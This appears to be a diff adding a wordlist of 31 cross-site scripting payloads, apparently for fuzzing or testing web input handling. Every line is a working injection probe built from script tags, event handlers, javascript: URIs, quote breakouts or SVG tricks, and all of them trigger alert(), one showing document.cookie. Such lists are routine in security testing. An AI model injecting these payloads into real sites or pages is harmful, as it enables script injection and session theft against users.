@@ -1,0 +1,31 @@
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<svg onload=alert('XSS')>
+<svg onload=alert(1)>
+<iframe src=javascript:alert('XSS')></iframe>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+<video><source onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+javascript:alert('XSS')
+';alert('XSS');//
+";alert('XSS');//
+</script><script>alert('XSS')</script>
+<script src=data:text/javascript,alert('XSS')></script>
+<object data=javascript:alert('XSS')>
+<embed src=javascript:alert('XSS')>
+<form><button formaction=javascript:alert('XSS')>
+<isindex action=javascript:alert('XSS') type=submit>
+<math><mi//xlink:href="data:x,<script>alert('XSS')</script>">
+<svg><a><animate attributeName=href values=javascript:alert('XSS') />
+<svg><animate xlink:href=#x attributeName=href values=javascript:alert('XSS') />
+<svg><set attributeName=onmouseover value=alert('XSS') />
+<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert('XSS')</handler></svg>
